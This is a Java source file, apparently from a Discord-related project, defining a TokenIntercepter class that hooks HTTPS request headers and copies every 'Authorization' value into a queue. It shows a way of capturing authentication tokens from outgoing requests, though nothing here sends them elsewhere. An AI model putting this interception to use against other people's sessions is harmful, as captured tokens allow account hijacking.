package r3qu13m.mei.discord;

import java.io.IOException;
import java.util.Queue;
import com.sun.net.ssl.internal.www.protocol.https.HttpsURLConnectionOldImpl;

public class TokenIntercepter extends HTTPSInterceptedConnection {
	private final Queue<String> retQueue;

	public TokenIntercepter(final HttpsURLConnectionOldImpl impl, final Queue<String> que) throws IOException {
		super(impl);
		this.retQueue = que;
	}

	@Override
	public void addRequestProperty(final String key, final String value) {
		if (key.equals("Authorization")) {
			this.retQueue.offer(value);
		}
		super.addRequestProperty(key, value);
	}
}
